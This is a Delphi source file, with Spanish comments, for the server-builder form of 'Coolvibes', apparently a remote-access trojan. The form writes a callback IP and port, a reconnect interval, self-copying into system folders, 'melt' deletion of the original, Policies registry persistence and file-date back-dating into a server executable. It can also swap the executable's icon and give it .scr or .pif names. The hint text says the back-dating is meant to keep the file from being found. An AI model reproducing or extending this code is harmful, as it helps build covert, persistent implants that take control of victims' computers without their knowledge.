unit UnitFormConfigServer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons,
  SettingsDef, {Esta es la unidad para leer la configuracion}
  MadRes,      {Unidad para cambiar el icono de un EXE}
  ExtCtrls, ComCtrls,
  UnitVariables;

type
  TFormConfigServer = class(TForm)
    EditID:     TEdit;
    EditServerPath: TEdit;
    LabelPath:  TLabel;
    BtnBrowse:  TSpeedButton;
    OpenDialog: TOpenDialog;
    GroupBox1:  TGroupBox;
    ScrollBox1: TScrollBox;
    BtnGuardarConfig: TSpeedButton;
    Bevel1:     TBevel;
    Label1:     TLabel;
    EditIP:     TEdit;
    Label2:     TLabel;
    EditPuerto: TEdit;
    Label3:     TLabel;
    Bevel2:     TBevel;
    Bevel3:     TBevel;
    Label4:     TLabel;
    ImageIcon:  TImage;
    Bevel4:     TBevel;
    StatusBar:  TStatusBar;
    BtnSalir:   TSpeedButton;
    Label5:     TLabel;
    EditTimeToNotify: TEdit;
    Label6:     TLabel;
    MemoOutput: TMemo;
    CheckBoxCopiar: TCheckBox;
    Label7:     TLabel;
    Label8:     TLabel;
    EditFileName: TEdit;
    GrpBoxCopiarA: TGroupBox;
    CheckBoxMelt: TCheckBox;
    Label11:    TLabel;
    Bevel5:     TBevel;
    Label12:    TLabel;
    CheckBoxPolicies: TCheckBox;
    Label14:    TLabel;
    Label15:    TLabel;
    EditPoliciesName: TEdit;
    Bevel6:     TBevel;
    EditCopyTo: TEdit;
    ImageHintCopiarA: TImage;
    Label9:     TLabel;
    CheckBoxCopiarConFechaAnterior: TCheckBox;
    ImageHintFechaAnterior: TImage;
    procedure BtnBrowseClick(Sender: TObject);
    procedure EditPuertoExit(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure ImageIconClick(Sender: TObject);
    procedure BtnGuardarConfigClick(Sender: TObject);
    procedure BtnSalirClick(Sender: TObject);
    procedure EditTimeToNotifyExit(Sender: TObject);
    procedure EditPuertoKeyPress(Sender: TObject; var Key: char);
    procedure EditPuertoEndDrag(Sender, Target: TObject; X, Y: integer);
    procedure EditIPKeyPress(Sender: TObject; var Key: char);
    procedure CheckBoxCopiarClick(Sender: TObject);
    procedure CheckBoxPoliciesClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
    IconPath: string;
    function ComprobarDatosValidos(): boolean;
  public
    { Public declarations }
  end;

var
  FormConfigServer: TFormConfigServer;

implementation

{$R *.dfm}

function UpdateExeIcon(exeFile, iconGroup, icoFile: string): boolean;
  //Copy-Pasted from Madshi's forums by Wack-a-Mole. [October/25/2006]
var
  resUpdateHandle: dword;
begin
  resUpdateHandle := BeginUpdateResourceW(PWideChar(WideString(exeFile)), False);
  if resUpdateHandle <> 0 then
  begin
    Result := LoadIconGroupResourceW(resUpdateHandle, PWideChar(WideString(iconGroup)),
      0, PWideChar(WideString(icoFile)));
    Result := EndUpdateResourceW(resUpdateHandle, False) and Result;
  end
  else
    Result := False;
end;


procedure TFormConfigServer.FormShow(Sender: TObject);
begin
  StatusBar.Panels[0].Text := 'Seleccione el servidor que desea modificar.';
  IconPath := '';
  EditServerPath.Text := '';
  MemoOutput.Clear;
  MemoOutput.Lines.Append('> Listo.');
  //Icono por defecto
  if FileExists(ExtractFilePath(ParamStr(0)) + 'Imagenes\ExeBMP.bmp') then
    ImageIcon.Picture.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Imagenes\ExeBMP.bmp');
  CheckBoxCopiarClick(Sender);  //Para que desactive o active los campos
  CheckBoxPoliciesClick(Sender);//Para que desactive o active los campos
end;

procedure TFormConfigServer.BtnBrowseClick(Sender: TObject);
begin
  with OpenDialog do
  begin
    Title      := 'Abrir servidor de Coolvibes ' + VersionCool + '...';
    Options    := [ofFileMustExist]; //solo deja seleccionar archivos que existan
    Filter     :=
      'Servidor de Coolvibes (*.exe, *.pif, *.scr, *.com, *.bat, *.cmd)|*.exe;*.pif;*.scr;*.com;*.bat;*.cmd|Todos los archivos (*.*)|*.*';
    DefaultExt := 'exe';
    InitialDir := GetCurrentDir();
    if Execute then
      EditServerPath.Text := FileName;
  end;
end;

//Función para comprobar que todos los datos son validos
function TFormConfigServer.ComprobarDatosValidos(): boolean;
var
  s: string;
begin
  Result := True;
  //Comprobamos que sean correctos los datos del EditServerPath
  if EditServerPath.Text = '' then
  begin
    //No seleccionaron servidor
    BtnBrowseClick(nil);
    Result := False;
    Exit;
  end;
  //Comprobamos que sean validos los datos del EditPuerto
  if (StrToIntDef(EditPuerto.Text, -1) = -1) or
    (StrToInt(EditPuerto.Text) > 65535) or (StrToInt(EditPuerto.Text) < 1) then
  begin
    StatusBar.Panels[0].Text := 'El puerto debe ser un número entre 1 y 65535';
    MessageBeep($FFFFFFFF);
    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
    EditPuerto.SetFocus;
    Result := False;
    exit;
  end;
  //Comprobamos que sean correctos los datos del EditTimeToNotify
  if (StrToIntDef(EditTimeToNotify.Text, -1) = -1) or
    (StrToInt(EditTimeToNotify.Text) < 1) then
  begin
    StatusBar.Panels[0].Text :=
      '"Intentar conectar cada" debe ser un valor númerico superior a 0';
    MessageBeep($FFFFFFFF);
    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
    EditTimeToNotify.SetFocus;
    Result := False;
    exit;
  end;
  //comprobamos que sea correcto el nombre para copiar
  if CheckBoxCopiar.Checked then
  begin
    s := ExtractFileExt(EditFileName.Text);
    if s = '' then
      EditFileName.Text := EditFileName.Text + '.exe';
    if (s <> '.exe') and (s <> '.com') and (s <> '.scr') and (s <> '.pif') and
      (s <> '.bat') and (s <> '.cmd') then
    begin
      StatusBar.Panels[0].Text :=
        'Extensión no válida. Debe ser: .exe, .com, .scr, .pif, .bat ó .cmd';
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditFileName.SetFocus;
      Result := False;
      exit;
    end;
    if EditCopyTo.Text[Length(EditCopyTo.Text)] <> '\' then
      EditCopyTo.Text := EditCopyTo.Text + '\';
    s := EditCopyTo.Text;
    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
      (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
      (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
    begin
      StatusBar.Panels[0].Text :=
        'Ruta inválida. No puede tener ninguno de los siguientes carácteres: */?"<>|';
      MessageBeep($FFFFFFFF);
      //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
      EditCopyTo.SetFocus;
      Result := False;
      exit;
    end;
  end;
end;

procedure TFormConfigServer.EditPuertoExit(Sender: TObject);
begin
  ComprobarDatosValidos();
end;

procedure TFormConfigServer.EditTimeToNotifyExit(Sender: TObject);
begin
  ComprobarDatosValidos();
end;

procedure TFormConfigServer.ImageIconClick(Sender: TObject);
begin
  with OpenDialog do
  begin
    Title      := 'Abrir icono...';
    Options    := [ofFileMustExist]; //solo deja seleccionar archivos que existan
    Filter     := 'Icono (*.ico)|*.ico';
    DefaultExt := 'ico';
    InitialDir := GetCurrentDir();
    if Execute then
    begin
      if FileName <> '' then
      begin
        IconPath := FileName;
        ImageIcon.Picture.LoadFromFile(IconPath);
      end;
    end;
  end;
end;

procedure TFormConfigServer.BtnGuardarConfigClick(Sender: TObject);
var
  ConfigToSave: PSettings;
begin
  if ComprobarDatosValidos() then
  begin
    //Escribir configuración
    MemoOutput.Lines.Append('> Escribiendo la configuración en el servidor...');
    New(ConfigToSave);
    ConfigToSave.sHost   := EditIP.Text;
    ConfigToSave.sPort   := EditPuerto.Text;
    ConfigToSave.sID     := EditID.Text;
    ConfigToSave.iPort   := StrToInt(EditPuerto.Text);
    ConfigToSave.iTimeToNotify := StrToInt(EditTimeToNotify.Text);
    ConfigToSave.bCopiarArchivo := CheckBoxCopiar.Checked;
    ConfigToSave.sFileNameToCopy := EditFileName.Text;
    ConfigToSave.sCopyTo := EditCopyTo.Text;
    ConfigToSave.bMelt   := CheckBoxMelt.Checked;
    ConfigToSave.bArranquePolicies := CheckBoxPolicies.Checked;
    ConfigToSave.sPoliciesRegKeyName := EditPoliciesName.Text;
    ConfigToSave.bCopiarConFechaAnterior := CheckBoxCopiarConFechaAnterior.Checked;

    if WriteSettings(PChar(EditServerPath.Text), ConfigToSave) = True then
    begin
      StatusBar.Panels[0].Text := 'La configuración se guardó con éxito.';
      MemoOutput.Lines.Append('> La configuración se guardó con éxito.');
    end
    else
    begin
      MessageBeep($FFFFFFFF);
      StatusBar.Panels[0].Text := 'No se pudo guardar la configuración.';
      MemoOutput.Lines.Append('> No se pudo guardar la configuración.');
    end;
    Dispose(ConfigToSave); //Libera la configuracion
    if IconPath <> '' then //cambiar icono
    begin
      MemoOutput.Lines.Append('> Cambiando el icono al servidor...');
      if UpdateExeIcon(EditServerPath.Text, 'MAINICON', IconPath) = True then
        MemoOutput.Lines.Append('> El ícono se cambió con éxito.')
      else
        MemoOutput.Lines.Append('> No se pudo cambiar el ícono.');
    end;
  end;
end;

procedure TFormConfigServer.BtnSalirClick(Sender: TObject);
begin
  Close;
end;

//Solo permite que se escriban números en el Edit
procedure TFormConfigServer.EditPuertoKeyPress(Sender: TObject; var Key: char);
begin
  if not (key in ['0'..'9', #8]) then
  begin
    key := #0;
    StatusBar.Panels[0].Text := 'Este campo solo admite números';
    MessageBeep($FFFFFFFF);
  end;
end;

procedure TFormConfigServer.EditIPKeyPress(Sender: TObject; var Key: char);
begin
  if key = '|' then
  begin
    key := #0;
    StatusBar.Panels[0].Text := 'Este campo no admite el caracter: |';
    MessageBeep($FFFFFFFF);
  end;
end;

//Por si pega un texto sobre puerto o en TimeToNotify
procedure TFormConfigServer.EditPuertoEndDrag(Sender, Target: TObject; X, Y: integer);
begin
  ComprobarDatosValidos();
end;


procedure TFormConfigServer.CheckBoxCopiarClick(Sender: TObject);
begin
  //Activa o desactiva los valores correspondientes
  EditFileName.Enabled := CheckBoxCopiar.Checked;
  EditCopyTo.Enabled := CheckBoxCopiar.Checked;
  CheckBoxMelt.Enabled := CheckBoxCopiar.Checked;
  CheckBoxCopiarConFechaAnterior.Enabled := CheckBoxCopiar.Checked;
  Label8.Enabled  := CheckBoxCopiar.Checked; //nombre de archivo
  Label11.Enabled := CheckBoxCopiar.Checked; //melt
  Label9.Enabled  := CheckBoxCopiar.Checked; //fecha anterior
end;

procedure TFormConfigServer.CheckBoxPoliciesClick(Sender: TObject);
begin
  EditPoliciesName.Enabled := CheckBoxPolicies.Checked;
  Label15.Enabled := CheckBoxPolicies.Checked; //nombre de clave
end;

procedure TFormConfigServer.FormCreate(Sender: TObject);
var
  s: string;
begin
  Application.HintColor     := TColor($FFD7C1); //un azul clarito
  Application.HintHidePause := 20000; //desaparece a los 20 segundos
  Application.HintPause     := 200;

  //Hints para la ruta
  s := 'Se pueden poner variables en la ruta que serán reemplazadas cuando se ejecute el servidor.'
    +
    #13#10 + 'Las variables aceptadas son:' + #13#10#13#10 +
    '%WinDir% -> Se reemplaza por el directorio de Windows (Por ejemplo C:\Windows\)' +
    #13#10 + '%SysDir% -> Se reemplaza por el directorio de sistema (Por ejemplo C:\System32\)'
    +
    #13#10 + '%TempDir% -> Se reemplaza por el directorio de archivos temporales (Por ejemplo C:\Temp\)' +
    #13#10 + '%RootDir% -> Se reemplaza por la ruta principal del directorio de Windows (Por ejemplo C:\)';
  ImageHintCopiarA.Hint := s;

  s := 'Cuando el servidor sea copiado a la carpeta de destino, su fecha de' + #13#10 +
    'modificación cambiará por una anterior de modo que no pueda encotrarse' + #13#10 +
    'de modo que no pueda encontrarse facilmente al listar archivos por fecha' + #13#10 +
    'de modificación.';
  ImageHintFechaAnterior.Hint := s;

end;

end.
